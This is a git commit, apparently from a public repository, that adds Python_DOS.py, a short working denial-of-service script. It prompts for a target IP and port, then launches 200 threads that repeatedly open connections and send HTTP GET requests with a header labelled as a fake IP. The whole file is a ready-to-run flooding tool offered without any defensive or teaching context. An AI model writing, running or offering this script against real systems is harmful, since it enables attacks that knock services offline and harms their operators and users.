2129cccdcf676d1ab5b762e191be63949808ea9c
5odead <71369187+5odead@users.noreply.github.com>
2025-03-15 13:01:48 +0530

    Create Python_DOS.py

---
+++ Python_DOS.py
@@ -0,0 +1,18 @@
+import threading
+import socket
+
+Target = input("Enter Target IP: ")
+Port = int(input("Enter Target Port Number: "))
+
+Fake_IP = "188.22.23.34"
+
+def Attack():
+        while True:
+                S = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+                S.connect((Target, Port))
+                S.send(("GET / HTTP/1.1\r\nHost: " + Fake_IP + "\r\n\r\n").encode('ascii'))
+                S.close()
+
+for i in range(200):
+        thread = threading.Thread(target=Attack, daemon=True)
+        thread.start()
